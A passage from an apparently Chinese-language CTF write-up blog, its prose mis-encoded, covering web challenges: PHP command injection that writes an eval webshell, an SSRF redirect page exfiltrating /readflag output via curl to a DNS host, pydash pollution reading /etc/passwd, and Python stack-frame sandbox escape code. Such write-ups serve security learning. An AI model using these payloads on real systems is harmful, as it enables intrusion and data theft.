href="https://lisien11.github.io/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE">love math</a>/)<br>ä½†æ˜¯è¿™é¢˜å°†chä¸ªç¦äº†å¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨dechexå‡½æ•°ã€‚è€Œå¦‚æœç›´æ¥ä½¿ç”¨hex2binå‡½æ•°æ¥å°†16è¿›åˆ¶æ•°å­—è¿›è¡Œè½¬æ¢åˆ™ä¼šæŠ¥é”™ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨äº†substræ¥å¼ºåˆ¶å°†16è¿›åˆ¶æ”¹ä¸ºå­—ç¬¦ä¸²ã€‚ä½¿å¾—hex2binå‡½æ•°èƒ½æ­£å¸¸è¿”å›è½¬æ¢åçš„å€¼ï¼Œ<br>è€Œåå°†å˜é‡<code>$a</code>å˜ä¸ºsystemçš„å‚æ•°æ¥å‘½ä»¤æ‰§è¡Œã€‚<br>æˆ‘ä»¬åªè¦åˆ©ç”¨bin2hexæ¥å°†å­—ç¬¦ä¸²è½¬æ¢æˆ16è¿›åˆ¶å­—ç¬¦å³å¯ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œå†™é©¬æ“ä½œæ¥æ–¹ä¾¿æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="string">&quot;printf &#x27;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#x27; &gt; 1.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><br>è¿™é“é¢˜ç›®mysqlçš„æ•°æ®åº“è´¦å·å¯†ç ä¸ºroot rootã€‚<br>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨mysql -u root -pâ€™rootâ€™ -e â€˜SHOW DATABASES;â€™æ¥æŸ¥æ‰¾æ•°æ®åº“å<br>æœ€åå¯ä»¥å†F1ag_Se3Re7 è¡¨ä¸‹æ‰¾åˆ°flag<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/2.png" class="" title="alt text"></p><h2 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h2><p>è¿™ä¸ªæ–¹æ³•æ˜¯æˆ‘åœ¨èµ›åçœ‹å…¶ä»–å¸ˆå‚…çš„wpçœ‹åˆ°çš„ï¼Œç›´æ¥åˆ©ç”¨evalå‡½æ•°æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>ç”±äºliunxä¸­evalå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²å½“æˆå‘½ä»¤æ¥æ‰§è¡Œï¼Œå³<code>eval l\\s</code>å…¶å®æ˜¯ç›¸å½“äºåœ¨ç»ˆç«¯ä¸­æ‰§è¡Œäº†<code>l\s</code>è€Œåœ¨bashä¸­ä¼šç›´æ¥å¿½ç•¥è¿™ä¸ªåæ–œæ ã€‚å³æ‰§è¡Œäº†lsã€‚è€Œæˆ‘ä»¬åœ¨ä¼ å…¥<code>eval l\s</code>ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†ä¸º<code>eval l\\s</code>è¿™æ ·wafæ˜¯æ£€æµ‹ä¸åˆ°lsçš„ä½†æ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚<br>é‚£ä¹ˆæˆ‘ä»¬æ‰§è¡Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°±å¯ä»¥è¿›è¡Œå†™é©¬æ“ä½œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval printf c\HJpbnRmI\C\c8P3Boc\CBldmFsKCRfUE9TVFsxXSk7cGhwaW5mbygpOz8%2BJyA%2BI\DIucGhw|base\64 -d|s\h</span><br></pre></td></tr></table></figure></p><h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>å®¡0dayã€‚ã€‚ã€‚<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/7.png" class="" title="alt text"><br>è¿™ä¸ªcmså¯ä»¥é€šè¿‡å¦‚ä¸Šæ–¹æ³•æ¥è®¿é—®æˆ‘ä»¬æƒ³è®¿é—®çš„functionã€‚<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/6.png" class="" title="alt text"><br>æˆ‘ä»¬åœ¨API api.phpæ–‡ä»¶ä¸‹å‘ç°äº†qrcodeè¿™ä¸ªæ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•é‡Œå­˜åœ¨äº†ä¸€ä¸ªå‡½æ•°dr_catcher_data<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/4.png" class="" title="alt text"><br><code>$ch = curl_init($url);</code><br>è¿™ä¸ªå‡½æ•°ä½¿ç”¨äº†curl_exceå‡½æ•°æ¥è®¿é—®è€Œurlå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/9.png" class="" title="alt text"><br>è€Œurlå°±æ˜¯å˜é‡<code>$thumb</code>çš„å€¼è€Œè¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„.<br>é‚£ä¹ˆè¿™é‡Œå°±æ˜¯ssrfçš„æ¼æ´ç‚¹,ä½†æ˜¯è¿™ä¸ªå‚æ•°ä¸èƒ½ç›´æ¥è®¾å®šä¸º127.0.0.1æ¥è¿›è¡Œè®¿é—®,éœ€è¦æˆ‘ä»¬æ­å»ºä¸€ä¸ª302é‡å®šå‘çš„ç½‘é¡µ,ä½¿å…¶é‡å®šå‘åˆ°127.0.0.1\flag.php?cmd=~<br>ä»¥æ­¤æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ.<br>æ­å»ºæºç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: 127.0.0.1/flag.php?cmd=curl+`/readflag`.DNSæœåŠ¡å™¨&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>ä¹‹åä½¿ç”¨<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/10.png" class="" title="alt text"><br>æ¥è§¦å‘.</p><h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>å’Œä¸Šä¸€é¢˜ç›¸æ¯”åŠ äº†ä¸€ä¸ªwaf,æ¥æ£€æµ‹å›¾ç‰‡æˆ‘ä»¬åªè¦åœ¨ç½‘é¡µè¾“å‡ºä¸€ä¸ªå›¾ç‰‡å†…å®¹å³å¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: 127.0.0.1/flag.php?cmd=curl+`/readflag`.DNSæœåŠ¡å™¨&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;1.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h1><p>è¿™é“é¢˜ç›®æ˜¯ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“,è¯´å®è¯åœ¨æ‰“æ¯”èµ›çš„æ—¶å€™æœ‰ç®€å•å®¡è®¡ä¸€ä¸‹è¿™ä¸ªä»£ç æ„Ÿè§‰æ˜¯åŸå‹é“¾æ±¡æŸ“,ä½†æ˜¯å‰é¢çš„æ£€æµ‹wafç»•ä¸è¿‡ä¹Ÿå°±ä¸äº†äº†ä¹‹äº†ã€‚<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦ç»•è¿‡è¿™ä¸ªæ£€æµ‹ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨httpæŠ¥æ–‡ä¸­<code>;</code>æ˜¯æ‹¿æ¥åˆ†éš”ä¸åŒçš„cookieçš„ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥ç»™userä¼ å…¥adm;nï¼Œåœ¨èµ›åæˆ‘çœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶æ¥ç»•è¿‡<br><code>admin=&quot;adm\073n&quot;;</code><br>ç»•è¿‡åå°±å¯ä»¥ä½¿ç”¨adminè·¯ç”±äº†<br>æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°ä¸€ä¸ªå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">async def <span class="title function_ invoke__">admin</span>(request):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>) == True:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(key) is str <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> not in key:</span><br><span class="line">            pollute = <span class="title function_ invoke__">Pollute</span>()</span><br><span class="line">            pydash.<span class="title function_ invoke__">set_</span>(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªpydash.set<em>(pollute, key, value)ï¼Œå…¶ç›´æ¥ä½¿ç”¨pydash.set</em>æ¥è®²keyä½œä¸ºé”®valueä½œä¸ºå†…å®¹åœ¨è®¾å®špolluteè¿™ä¸ªå¯¹è±¡ã€‚è€Œè¿™ä¸ªkeyå’Œvalueæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè¿™å°±å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‚æ•°ä½œä¸ºkey<br><code>__init__.__globals__.__file__</code>è¿™æ ·å°±å¯ä»¥æ±¡æŸ“åˆ°<code>__file__</code>ï¼Œè€Œsrcè¿™ä¸ªè·¯ç”±ç›´æ¥è¾“å‡ºäº†<strong>file</strong>çš„æ–‡ä»¶å†…å®¹ï¼Œè¿™å°±ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>è€Œè¿™é“é¢˜è¿˜åŠ äº†ä¸ªwafã€‚å…¶ä¼šæ£€æµ‹<strong>.æˆ‘çœ‹å¤ç°çš„wpæ˜¯é€šè¿‡å®¡è®¡pydash.set_æ¥å‘ç°å¯ä»¥é€šè¿‡<code>\\\\</code>æ¥ç»•è¿‡,å³`{â€œkeyâ€:â€</strong>init<strong>\\.</strong>globals<strong>\\.</strong>file<strong>â€œ,â€valueâ€:â€/etc/passwdâ€}<code>å¯ä»¥å°†</code></strong>file__`æ±¡æŸ“ä¸º/etc/passwdã€‚<br>åœ¨å¤ç°çš„ç¯å¢ƒä¸‹ç›´æ¥è¯»å–/proc/self/environå‘ç°å¹¶æ²¡æœ‰flagã€‚å°è¯•äº†å‡ æ¬¡å‘ç°flagå¤§æ¦‚ç‡éœ€è¦rceæ‰èƒ½æ‹¿åˆ°flag,ç½‘ä¸Šçš„wpå¤ªå°‘äº†ï¼Œæ²¡å‡ ç¯‡å†™äº†è¿™é¢˜ï¼Œæ‰€æœ‰å…ˆç©ºç€ç­‰wpå¤šäº†åœ¨ç»§ç»­å¤ç°</p><h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>è¿™é¢˜ä½¿ç”¨çš„æ˜¯æ ˆå¸§é€ƒé€¸<br><a href="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#L3HCTF2024">pythonåˆ©ç”¨æ ˆå¸§è¿›è¡Œæ²™ç®±é€ƒé€¸</a><br><a href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3Dmy7Lh727TD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1">Pythonåˆ©ç”¨æ ˆå¸§é€ƒé€¸</a><br>å› ä¸ºå…¶å°†<strong>ç»™ç¦äº†å¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¸¸è§„æ–¹æ³•æ¥è¿›è¡Œé€ƒé€¸<br>æ ˆå¸§é€ƒé€¸ä¸»è¦ä½¿ç”¨çš„å‡ ä¸ªæ–¹æ³•f_code( è¿”å›ä¸€ä¸ªä»£ç å¯¹è±¡ï¼ˆcode objectï¼‰ï¼ŒåŒ…å«äº†å‡½æ•°æˆ–æ–¹æ³•çš„å­—èŠ‚ç æŒ‡ä»¤ã€å¸¸é‡ã€å˜é‡åç­‰ä¿¡æ¯ã€‚)ï¼Œf_back(è¿”å›ä¸Šä¸€æ ˆå¸§ï¼Œä¸»è¦ç”¨äºé€ƒé€¸)ï¼Œf_globals(ç”¨äºè·å–å…¨å±€å˜é‡)<br>æˆ‘ä»¬å…ˆå°è¯•ä¼ å…¥<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">gen = my_generator()</span><br><span class="line">frame = gen.gi_frame</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Local Variables:&quot;</span>, frame.f_locals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Global Variables:&quot;</span>, frame.f_globals)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Code Object:&quot;</span>, frame.f_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</span><br></pre></td></tr></table></figure><br>å›æ˜¾<br><img src="/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/11.png" class="" title="alt text"><br>ä¼šå‘ç°å…¶æ²¡æœ‰è¿‡æ»¤,å¯ä»¥ä½¿ç”¨æ ˆå¸§<br>æˆ‘ä»¬ä¼ å…¥<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g = f()  </span><br><span class="line">    frame = <span class="built_in">next</span>(g) </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure><br>æ¥å°è¯•ä½¿ç”¨f_backè¿›è¡Œé€ƒé€¸å‘ç°å…¶å›æ˜¾{â€œresultâ€:â€LOAD_GLOBAL\n\nâ€}<br>åº”è¯¥æ˜¯è¿›è¡Œäº†è¿‡æ»¤,ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªç”Ÿæˆå™¨<code>frame = [x for x in g][0]</code>æ¥å¾—åˆ°å™¨æ ˆå¸§å¯¹è±¡<br>ä¹‹åä½¿ç”¨f_backå’Œf_globalsæ¥å¾—åˆ°å…¨å±€å˜é‡`</strong>globals<strong><code><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()  </span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>] </span><br><span class="line">    <span class="built_in">globals</span>=frame.f_back.f_back.f_back.f_globals</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">globals</span>)</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>ä½†backè¾“å‡ºè„šæœ¬æ–‡ä»¶åæ—¶å³ä¸ºæˆåŠŸé€ƒé€¸ã€‚å¾—åˆ°globalsåæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°</code></strong>builtins<strong><code>è€Œ</code></strong>builtins<strong><code>å«æœ‰ä¸€äº›å†…ç½®å‡½æ•°ã€‚å¦‚ä¸‹</code>â€˜ArithmeticErrorâ€™, â€˜AssertionErrorâ€™, â€˜AttributeErrorâ€™, â€˜BaseExceptionâ€™, â€˜BaseExceptionGroupâ€™, â€˜BlockingIOErrorâ€™, â€˜BrokenPipeErrorâ€™, â€˜BufferErrorâ€™, â€˜BytesWarningâ€™, â€˜ChildProcessErrorâ€™, â€˜ConnectionAbortedErrorâ€™, â€˜ConnectionErrorâ€™, â€˜ConnectionRefusedErrorâ€™, â€˜ConnectionResetErrorâ€™, â€˜DeprecationWarningâ€™, â€˜EOFErrorâ€™, â€˜Ellipsisâ€™, â€˜EncodingWarningâ€™, â€˜EnvironmentErrorâ€™, â€˜Exceptionâ€™, â€˜ExceptionGroupâ€™, â€˜Falseâ€™, â€˜FileExistsErrorâ€™, â€˜FileNotFoundErrorâ€™, â€˜FloatingPointErrorâ€™, â€˜FutureWarningâ€™, â€˜GeneratorExitâ€™, â€˜IOErrorâ€™, â€˜ImportErrorâ€™, â€˜ImportWarningâ€™, â€˜IndentationErrorâ€™, â€˜IndexErrorâ€™, â€˜InterruptedErrorâ€™, â€˜IsADirectoryErrorâ€™, â€˜KeyErrorâ€™, â€˜KeyboardInterruptâ€™, â€˜LookupErrorâ€™, â€˜MemoryErrorâ€™, â€˜ModuleNotFoundErrorâ€™, â€˜NameErrorâ€™, â€˜Noneâ€™, â€˜NotADirectoryErrorâ€™, â€˜NotImplementedâ€™, â€˜NotImplementedErrorâ€™, â€˜OSErrorâ€™, â€˜OverflowErrorâ€™, â€˜PendingDeprecationWarningâ€™, â€˜PermissionErrorâ€™, â€˜ProcessLookupErrorâ€™, â€˜RecursionErrorâ€™, â€˜ReferenceErrorâ€™, â€˜ResourceWarningâ€™, â€˜RuntimeErrorâ€™, â€˜RuntimeWarningâ€™, â€˜StopAsyncIterationâ€™, â€˜StopIterationâ€™, â€˜SyntaxErrorâ€™, â€˜SyntaxWarningâ€™, â€˜SystemErrorâ€™, â€˜SystemExitâ€™, â€˜TabErrorâ€™, â€˜TimeoutErrorâ€™, â€˜Trueâ€™, â€˜TypeErrorâ€™, â€˜UnboundLocalErrorâ€™, â€˜UnicodeDecodeErrorâ€™, â€˜UnicodeEncodeErrorâ€™, â€˜UnicodeErrorâ€™, â€˜UnicodeTranslateErrorâ€™, â€˜UnicodeWarningâ€™, â€˜UserWarningâ€™, â€˜ValueErrorâ€™, â€˜Warningâ€™, â€˜ZeroDivisionErrorâ€™, â€˜_â€™, â€˜</strong>build<em>class<strong>â€˜, â€˜</strong>debug<strong>â€˜, â€˜</strong>doc<strong>â€˜, â€˜</strong>import<strong>â€˜, â€˜</strong>loader<strong>â€˜, â€˜</strong>name<strong>â€˜, â€˜</strong>package<strong>â€˜, â€˜</strong>spec<strong>â€˜, â€˜absâ€™, â€˜aiterâ€™, â€˜allâ€™, â€˜anextâ€™, â€˜anyâ€™, â€˜asciiâ€™, â€˜binâ€™, â€˜boolâ€™, â€˜breakpointâ€™, â€˜bytearrayâ€™, â€˜bytesâ€™, â€˜callableâ€™, â€˜chrâ€™, â€˜classmethodâ€™, â€˜compileâ€™, â€˜complexâ€™, â€˜copyrightâ€™, â€˜creditsâ€™, â€˜delattrâ€™, â€˜dictâ€™, â€˜dirâ€™, â€˜divmodâ€™, â€˜enumerateâ€™, â€˜evalâ€™, â€˜execâ€™, â€˜exitâ€™, â€˜filterâ€™, â€˜floatâ€™, â€˜formatâ€™, â€˜frozensetâ€™, â€˜getattrâ€™, â€˜globalsâ€™, â€˜hasattrâ€™, â€˜hashâ€™, â€˜helpâ€™, â€˜hexâ€™, â€˜idâ€™, â€˜inputâ€™, â€˜intâ€™, â€˜isinstanceâ€™, â€˜issubclassâ€™, â€˜iterâ€™, â€˜lenâ€™, â€˜licenseâ€™, â€˜listâ€™, â€˜localsâ€™, â€˜mapâ€™, â€˜maxâ€™, â€˜memoryviewâ€™, â€˜minâ€™, â€˜nextâ€™, â€˜objectâ€™, â€˜octâ€™, â€˜openâ€™, â€˜ordâ€™, â€˜powâ€™, â€˜printâ€™, â€˜propertyâ€™, 